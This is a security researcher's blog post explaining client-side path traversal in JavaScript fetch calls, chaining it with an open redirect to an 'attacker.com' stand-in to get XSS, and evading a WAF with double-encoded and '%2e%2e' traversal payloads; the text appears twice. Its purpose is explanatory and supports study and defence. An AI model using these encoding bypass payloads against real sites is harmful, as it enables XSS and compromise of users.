---
source: matanber
source_url: https://matanber.com/blog/cspt-levels
title: "Bypassing WAFs to Exploit CSPT Using Encoding Levels - Matan Berson"
published: 2024-05-10T00:00:00.000Z
description: "An introduction to CSPT, including some advances WAF bypass and exploitation techniques."
---

.

# Bypassing WAFs to Exploit CSPT Using Encoding Levels

# A Brief Intro to CSPT

Client Side Path Traversal (or CSPT for short) is a vulnerability which occurs when attacker-controlled input which is not properly encoded lands in the [path component](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL#basics_anatomy_of_a_url) of a URL, which the JavaScript code of an application sends a request to. When this happens, an attacker can inject path traversal sequences (`../`) to the path of the URL, making the JS code send a request to an arbitrary endpoint. This vulnerability doesn't have any impact in and of itself, but it can often be chained with different gadgets to get more impact.

## A Vulnerable Example

To help explain this vulnerability type, let's walk through an example. Say you have a blog website, and you want to make a page (say `https://example.com/viewpost`) where users could view posts. One way to implement this would be to include the following JS code in the page:

```
// get the value of the URL parameter "p"
const post_name = new URLSearchParams(location.search).get("p");
const blog_post_response = await fetch("/api/posts/get_content/" + post_name);
const post_content = await blog_post_response.text();
display_post_html(post_content);
```

When a user navigates to `https://example.com/viewpost?p=543`, the JS code will get the HTML content of post number 543 by sending a request to `https://example.com/api/posts/get_content/543`, and will then display this content to the user. Because the `p` parameter can include attacker-controlled input, and its value is used directly in the path component of the URL which the page requests, this code is vulnerable to CSPT. If an attacker sent a victim a link to `https://example.com/viewpost?p=../../../asdf`, and the victim clicked on it, then the URL which gets constructed in the page would be `https://example.com/api/posts/get_content/../../../asdf` and as a result the page would send a request to `https://example.com/asdf`. The rest of the JS code in the page would run normally, and would use the response to this request **as if it was the content of a blog post**, because it would be stored in the `blog_post_response` variable.

As you can see, the attacker can make the page send the request to an arbitrary endpoint in `https://example.com/`. To demonstrate the potential impact of this, let's assume that the application has an open redirect gadget in `https://example.com/redirect?u=...`. In that case, an attacker can chain the CSPT vulnerability with the open redirect gadget by using a payload such as `../../../?u=https://attacker.com`. When this payload is used, the vulnerable page sends the fetch request to `https://example.com/redirect?u=https://attacker.com`, and the response to this request would be a redirect to `https://attacker.com`. Because `fetch` automatically follows redirects by default, a subsequent request would be sent to `https://attacker.com`, and the response to **that** request would be stored in the `blog_post_response` variable. Because the attacker controls this response, the attacker can control the HTML content of the blog post which would be displayed to the user, most likely leading to XSS.

Here's a short recap of what we've just seen:

1. A post-serving page calls the `fetch` function, sending a request to a URL with attacker-controlled input which is not properly encoded in its path, allowing the attacker to inject `../` sequences to the path and make the request get sent to an arbitrary endpoint. This behavior is refered to as a CSPT vulnerability.
2. The attacker makes the request get sent to an endpoint which contains an open redirect vulnerability.
3. The endpoint responds with a redirect to an attacker-controlled domain.
4. This `fetch` function automatically follows this redirect, sending a request to the attacker-controlled domain.
5. The attacker-controlled domain responds with some malicious response.
6. The `fetch` function finishes and returns the malicious response.
7. The page treats that response as if it was the content of a blog post, leading to XSS.

![The attack utilizing a query parameter](https://matanber.com/images/blog/cspt-query-param.png)


# The Problem

In a recent live hacking event, I found a bug similar to the one described above. With that bug however, the attacker-controlled input didn't come from a query parameter, but from a path parameter. In other words, the URL looked more like `https://example.com/viewpost/543` and not `https://example.com/viewpost?p=543`. The input could still contain `../` sequences, but they had to be URL-encoded so the URL would get parsed properly. The target also had an open redirect gadget, which I was trying to chain with the CSPT I found. However, when I tried to exploit this bug by navigating to a URL with a payload of `../../../?u=https://attacker.com` (`https://example.com/viewpost/..%2f..%2f..%2fredirect%3fu=https:%2f%2fattacker.com`), the navigation got blocked by a WAF which the target was using.

After messing around with the URL a bit, I figured out why the WAF was blocking the request, but in order to explain that I'll first need to define a few informal terms:

- The **depth** of a URL is equal to the number of directories in its path, minus the number of `../` sequences in it. For example, the depth of `https://example.com/a` would be 0, the depth of `https://example.com/a/b` would be 1, and the depth of `https://example.com/a/../b/c` would also be 1, and the depth of `https://example.com/a/../../c` would be -1.
- The **encoding level** of a string is the number of times you have to repeatedly URL-decode it in order to properly decode the string. For example, the encoding level of the string `aa` is 0 as you don't have to URL-decode it at all, and the encoding level of the string `b%252561` is 3, as you have to URL-decode it 3 times to get the decoded string `ba` (`b%252561 -> b%2561 -> b%61 -> ba`).

What the WAF was doing in order to prevent path traversal attacks is calculate the depth of the URL of the request, and block the request if this depth is negative. In order to prevent path traversal attacks that use higher encoding levels, the WAF decoded the URL a certain number of times before checking its depth. I'll refer to this number as **the WAF's level**. For example, if the WAF's level is greater than or equal to 2, the following URL would be blocked `https://example.com/a/..%252f..%252fc` as its depth would be -1 after 2 decodings. This behavior prevented my exploit attempts, because the depth of the URL which I had to use was negative.



While trying to bypass this WAF, I noticed two key things:

1. If I navigate to `https://example.com/viewpost/%2561`, then application sends a request to `https://example.com/api/posts/get_content/a`. In other words, the application decodes our input a certain number of times before passing it to the `fetch` function. I'll refer to this number as **the app's level**.
2. The browser treats `%2e%2e/` sequences exactly the same as `../` sequences, even though the dots in the first sequence are encoded.

Finally, all of the pieces we need for the bypass are in place. Now let's look at:

## The Bypass

The bypass is different depending on whether the WAF's level is greater than, smaller than, or equal to the app's level. Let's look at the different cases:

If the the WAF's level is **smaller than** the app's level, we simply encode our payload repeatedly until the WAF doesn't block the request anymore. For example, if the WAF's level is 1 and the app's level is 2, then we can use a double-encoded payload such as `..%252f..%252f..%252fasdf`. The WAF wouldn't recognize the `../` sequences, but the application would decode the payload twice before passing it to the `fetch` function as `../../../asdf` so it would work.

If the the WAF's level is **greater than** the app's level, we include many encoded `a/a` sequences in the path that the WAF would decode but the application wouldn't. For example, if the WAF's level is 2 and the app's level is 1, then we can use a payload such as `a%252fa%252fa%252fa%2f..%2f..%2f..%2f..%2fasdf`. The WAF would decode this payload to `a/a/a/a/../../../../asdf`, so the depth would be 0 (4 directories minus 4 `../` sequences). However, the payload would be passed to the fetch function as `a%2fa%2fa%2fa/../../../../asdf`, which is equivalent to `../../../asdf`, so it would work.

Finally, if the the WAF's level is **equal to** the app's level, we use a payload that would get decoded by both the browser and the WAF to `%2e%2e/%2e%2e/%2e%2e/asdf`. For the WAF, this payload would have a depth of 3. However, because the browser treats `%2e%2e/` sequences exactly the same as `../` sequences, they payload would actually work!

For my live hacking event bug I used the last bypass technique as both the WAF and the app had a level of 1. The URL which I used was similar to `https://example.com/viewpost/%252e%252e%2f%252e%252e%2f%252e%252e%2fredirect%3fu=https:%2f%2fattacker.com`. The WAF and the browser decoded this URL to `https://example.com/viewpost/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com` which has a positive depth, so the request wasn't blocked. The app decoded the payload once, and URL which got passed to fetch was `https://example.com/api/posts/get_content/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com`, which is equivalent to `https://example.com/redirect?u=https://attacker.com`. Using a malicious response, I was then able to get XSS on the target.

![The complete attack, including the WAF bypass](https://matanber.com/images/blog/cspt-path-param.png)

Thanks for reading this post!

If you found it interesting or useful and want to know when I release a new post, you can follow me on twitter at [@MtnBer](https://twitter.com/MtnBer). If you have any questions, feel free to DM me there.

\# A Brief Intro to CSPT
Client Side Path Traversal (or CSPT for short) is a vulnerability which occurs when attacker-controlled input which is not properly encoded lands in the \[path&nbsp;component\](https://developer.mozilla.org/en-US/docs/Learn/Common\_questions/Web\_mechanics/What\_is\_a\_URL#basics\_anatomy\_of\_a\_url) of a URL, which the JavaScript code of an application sends a request to. When this happens, an attacker can inject path traversal sequences (\`../\`) to the path of the URL, making the JS code send a request to an arbitrary endpoint. This vulnerability doesn't have any impact in and of itself, but it can often be chained with different gadgets to get more impact.
&nbsp;

\## A Vulnerable Example
To help explain this vulnerability type, let's walk through an example. Say you have a blog website, and you want to make a page (say \`https://example.com/viewpost\`) where users could view posts. One way to implement this would be to include the following JS code in the page:
\`\`\`js
// get the value of the URL parameter "p"
const post\_name = new URLSearchParams(location.search).get("p");
const blog\_post\_response = await fetch("/api/posts/get\_content/" + post\_name);
const post\_content = await blog\_post\_response.text();
display\_post\_html(post\_content);
\`\`\`
When a user navigates to \`https://example.com/viewpost?p=543\`, the JS code will get the HTML content of post number 543 by sending a request to \`https://example.com/api/posts/get\_content/543\`, and will then display this content to the user. Because the \`p\` parameter can include attacker-controlled input, and its value is used directly in the path component of the URL which the page requests, this code is vulnerable to CSPT. If an attacker sent a victim a link to \`https://example.com/viewpost?p=../../../asdf\`, and the victim clicked on it, then the URL which gets constructed in the page would be \`https://example.com/api/posts/get\_content/../../../asdf\` and as a result the page would send a request to \`https://example.com/asdf\`. The rest of the JS code in the page would run normally, and would use the response to this request \*\*as if it was the content of a blog post\*\*, because it would be stored in the \`blog\_post\_response\` variable.
\
As you can see, the attacker can make the page send the request to an arbitrary endpoint in \`https://example.com/\`. To demonstrate the potential impact of this, let's assume that the application has an open redirect gadget in \`https://example.com/redirect?u=...\`. In that case, an attacker can chain the CSPT vulnerability with the open redirect gadget by using a payload such as \`../../../?u=https://attacker.com\`. When this payload is used, the vulnerable page sends the fetch request to \`https://example.com/redirect?u=https://attacker.com\`, and the response to this request would be a redirect to \`https://attacker.com\`. Because \`fetch\` automatically follows redirects by default, a subsequent request would be sent to \`https://attacker.com\`, and the response to \*\*that\*\* request would be stored in the \`blog\_post\_response\` variable. Because the attacker controls this response, the attacker can control the HTML content of the blog post which would be displayed to the user, most likely leading to XSS.
\
Here's a short recap of what we've just seen:
1\. A post-serving page calls the \`fetch\` function, sending a request to a URL with attacker-controlled input which is not properly encoded in its path, allowing the attacker to inject \`../\` sequences to the path and make the request get sent to an arbitrary endpoint. This behavior is refered to as a CSPT vulnerability.
2\. The attacker makes the request get sent to an endpoint which contains an open redirect vulnerability.
3\. The endpoint responds with a redirect to an attacker-controlled domain.
4\. This \`fetch\` function automatically follows this redirect, sending a request to the attacker-controlled domain.
5\. The attacker-controlled domain responds with some malicious response.
6\. The \`fetch\` function finishes and returns the malicious response.
7\. The page treats that response as if it was the content of a blog post, leading to XSS.
!\[The attack utilizing a query parameter\](/images/blog/cspt-query-param.png)
&nbsp;

\# The Problem
In a recent live hacking event, I found a bug similar to the one described above. With that bug however, the attacker-controlled input didn't come from a query parameter, but from a path parameter. In other words, the URL looked more like \`https://example.com/viewpost/543\` and not \`https://example.com/viewpost?p=543\`. The input could still contain \`../\` sequences, but they had to be URL-encoded so the URL would get parsed properly. The target also had an open redirect gadget, which I was trying to chain with the CSPT I found. However, when I tried to exploit this bug by navigating to a URL with a payload of \`../../../?u=https://attacker.com\` (\`https://example.com/viewpost/..%2f..%2f..%2fredirect%3fu=https:%2f%2fattacker.com\`), the navigation got blocked by a WAF which the target was using.
\
After messing around with the URL a bit, I figured out why the WAF was blocking the request, but in order to explain that I'll first need to define a few informal terms:
\- The \*\*depth\*\* of a URL is equal to the number of directories in its path, minus the number of \`../\` sequences in it. For example, the depth of \`https://example.com/a\` would be 0, the depth of \`https://example.com/a/b\` would be 1, and the depth of \`https://example.com/a/../b/c\` would also be 1, and the depth of \`https://example.com/a/../../c\` would be -1.
\- The \*\*encoding level\*\* of a string is the number of times you have to repeatedly URL-decode it in order to properly decode the string. For example, the encoding level of the string \`aa\` is 0 as you don't have to URL-decode it at all, and the encoding level of the string \`b%252561\` is 3, as you have to URL-decode it 3 times to get the decoded string \`ba\` (\`b%252561 -> b%2561 -> b%61 -> ba\`).
What the WAF was doing in order to prevent path traversal attacks is calculate the depth of the URL of the request, and block the request if this depth is negative. In order to prevent path traversal attacks that use higher encoding levels, the WAF decoded the URL a certain number of times before checking its depth. I'll refer to this number as \*\*the WAF's level\*\*. For example, if the WAF's level is greater than or equal to 2, the following URL would be blocked <code>ht<span>tps://</span>example.com/a/..<span class="colorize">%252f</span>..<span class="colorize">%252f</span>c</code> as its depth would be -1 after 2 decodings. This behavior prevented my exploit attempts, because the depth of the URL which I had to use was negative.
\
While trying to bypass this WAF, I noticed two key things:
1\. If I navigate to \`https://example.com/viewpost/%2561\`, then application sends a request to \`https://example.com/api/posts/get\_content/a\`. In other words, the application decodes our input a certain number of times before passing it to the \`fetch\` function. I'll refer to this number as \*\*the app's level\*\*.
2\. The browser treats \`%2e%2e/\` sequences exactly the same as \`../\` sequences, even though the dots in the first sequence are encoded.

Finally, all of the pieces we need for the bypass are in place. Now let's look at:
&nbsp;

\## The Bypass
The bypass is different depending on whether the WAF's level is greater than, smaller than, or equal to the app's level. Let's look at the different cases:
\
If the the WAF's level is \*\*smaller than\*\* the app's level, we simply encode our payload repeatedly until the WAF doesn't block the request anymore. For example, if the WAF's level is 1 and the app's level is 2, then we can use a double-encoded payload such as <code>..<span class="colorize">%252f</span>..<span class="colorize">%252f</span>..<span class="colorize">%252f</span>asdf</code>. The WAF wouldn't recognize the \`../\` sequences, but the application would decode the payload twice before passing it to the \`fetch\` function as \`../../../asdf\` so it would work.
\
If the the WAF's level is \*\*greater than\*\* the app's level, we include many encoded \`a/a\` sequences in the path that the WAF would decode but the application wouldn't. For example, if the WAF's level is 2 and the app's level is 1, then we can use a payload such as <code>a<span class="colorize">%252f</span>a<span class="colorize">%252f</span>a<span class="colorize">%252f</span>a%2f..%2f..%2f..%2f..%2fasdf</code>. The WAF would decode this payload to \`a/a/a/a/../../../../asdf\`, so the depth would be 0 (4 directories minus 4 \`../\` sequences). However, the payload would be passed to the fetch function as \`a%2fa%2fa%2fa/../../../../asdf\`, which is equivalent to \`../../../asdf\`, so it would work.
\
Finally, if the the WAF's level is \*\*equal to\*\* the app's level, we use a payload that would get decoded by both the browser and the WAF to \`%2e%2e/%2e%2e/%2e%2e/asdf\`. For the WAF, this payload would have a depth of 3. However, because the browser treats \`%2e%2e/\` sequences exactly the same as \`../\` sequences, they payload would actually work!
\
For my live hacking event bug I used the last bypass technique as both the WAF and the app had a level of 1. The URL which I used was similar to <code>ht<span>tps://</span>example.com/viewpost/<span class="colorize">%252e%252e</span>%2f<span class="colorize">%252e%252e</span>%2f<span class="colorize">%252e%252e</span>%2fredirect%3fu=https:%2f%2fattacker.com</code>. The WAF and the browser decoded this URL to \`https://example.com/viewpost/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com\` which has a positive depth, so the request wasn't blocked. The app decoded the payload once, and URL which got passed to fetch was \`https://example.com/api/posts/get\_content/%2e%2e/%2e%2e/%2e%2e/redirect?u=https://attacker.com\`, which is equivalent to \`https://example.com/redirect?u=https://attacker.com\`. Using a malicious response, I was then able to get XSS on the target.
!\[The complete attack, including the WAF bypass\](/images/blog/cspt-path-param.png)
\
\
Thanks for reading this post!
If you found it interesting or useful and want to know when I release a new post, you can follow me on twitter at \[@MtnBer\](https://twitter.com/MtnBer). If you have any questions, feel free to DM me there.